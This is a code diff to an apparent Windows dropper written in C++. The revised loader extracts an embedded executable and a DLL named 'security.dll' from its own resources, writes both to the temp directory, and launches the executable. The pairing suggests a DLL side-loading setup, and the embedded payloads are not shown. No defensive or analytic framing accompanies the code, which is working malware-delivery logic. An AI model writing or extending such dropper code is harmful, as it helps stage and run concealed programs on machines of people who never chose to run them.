@@ -3,61 +3,83 @@
 #define UNICODE
 #include <Windows.h>
 #include <iostream>
-#include "../resources/resource.hpp"
+#include <filesystem>
+#include "../resources/resources.hpp"
 #include "../error-wrapper/error.hpp"
 
-// Function to load the resource, and then launch it
+// Function to load the resources, and then launch them
 PROCESS_INFORMATION loadResource()
 {
-    // Finding the .exe resource
+    // Finding the .exe and the .dll resource
     HMODULE hModule {nullptr};
-    HRSRC hResource {FindResource(nullptr, (LPCWSTR)IDR_EXE, RT_RCDATA)};
-    HGLOBAL hGlobal;
-    BYTE * pExeResource;
-    HANDLE hFile {INVALID_HANDLE_VALUE};
 
-    // Calculating the resource size dynamically
-    DWORD size {SizeofResource(hModule, hResource)};
+    HRSRC hExeResource {FindResource(nullptr, (LPCWSTR)IDR_EXE, RT_RCDATA)};
+    HRSRC hDllResource {FindResource(nullptr, (LPCWSTR)IDR_DLL, RT_RCDATA)};
+
+    HGLOBAL hExeGlobal;
+    HGLOBAL hDllGlobal;
+
+    BYTE * pExeResource;
+    BYTE * pDllResource;
+
+    HANDLE hExeFile {INVALID_HANDLE_VALUE};
+    HANDLE hDllFile {INVALID_HANDLE_VALUE};
+
+    // Calculating resources size dynamically
+    DWORD exeSize {SizeofResource(hModule, hExeResource)};
+    DWORD dllSize {SizeofResource(hModule, hDllResource)};
 
     // Structure that we want to use with CreateProcess(), returning PROCESS_INFORMATION for the pi.dwProcessId
     STARTUPINFOW si {sizeof(si)};
     PROCESS_INFORMATION pi {};
 
-    if (hResource == nullptr)
+    if ((hExeResource == nullptr) || (hDllResource == nullptr))
     {
-        Error("Unable to find the resource!\n");
+        Error("Unable to find resources!\n");
     }
 
-    hGlobal = LoadResource(nullptr, hResource);
+    hExeGlobal = LoadResource(nullptr, hExeResource);
+    hDllGlobal = LoadResource(nullptr, hDllResource);
 
-    if (hGlobal == nullptr)
+    if ((hExeGlobal == nullptr) || (hDllGlobal == nullptr))
     {
-        Error("Unable to load the resource!\n");
+        Error("Unable to load resources!\n");
     }
 
-    pExeResource = (BYTE*)LockResource(hGlobal);
+    pExeResource = (BYTE*)LockResource(hExeGlobal);
+    pDllResource = (BYTE*)LockResource(hDllGlobal);
 
-    if (pExeResource == nullptr)
+    if ((pExeResource == nullptr) || (pDllResource == nullptr))
     {
-        Error("Unable to lock the resource and convert it to BYTE*!\n");
+        Error("Unable to lock resources and convert them to BYTE*!\n");
     }
 
-    // Creating the file for launching
-    hFile = CreateFile(L"C:\\PerfLogs\\unpacked.exe", GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    // Creating files for launching
+    std::wstring sExePath {std::filesystem::temp_directory_path().wstring().append(L"unpacked.exe")};
+    const WCHAR* wExePath {sExePath.c_str()};
+    hExeFile = CreateFile(wExePath, GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
 
-    if (hFile != INVALID_HANDLE_VALUE)
+    std::wstring sDllPath {std::filesystem::temp_directory_path().wstring().append(L"security.dll")};
+    const WCHAR* wDllPath {sDllPath.c_str()};
+    hDllFile = CreateFile(wDllPath, GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+
+    if ((hExeFile != INVALID_HANDLE_VALUE) && (hDllFile != INVALID_HANDLE_VALUE))
     {
-        DWORD bytesWritten {0};
-        WriteFile(hFile, pExeResource, size, &bytesWritten, nullptr);
-        CloseHandle(hFile);
+        DWORD bytesExeWritten {0};
+        WriteFile(hExeFile, pExeResource, exeSize, &bytesExeWritten, nullptr);
+        CloseHandle(hExeFile);
+
+        DWORD bytesDllWritten {0};
+        WriteFile(hDllFile, pDllResource, dllSize, &bytesDllWritten, nullptr);
+        CloseHandle(hDllFile);
     }
     else
     {
-        Error("Unable to create the file!\n");
+        Error("Unable to create files!\n");
     }
 
     // Launching the file and returning the pi structure for future use
-    CreateProcess(L"C:\\PerfLogs\\unpacked.exe",
+    CreateProcess(wExePath,
                   nullptr , nullptr, nullptr, FALSE,
                   CREATE_NEW_CONSOLE,
                   nullptr, nullptr, &si, &pi);
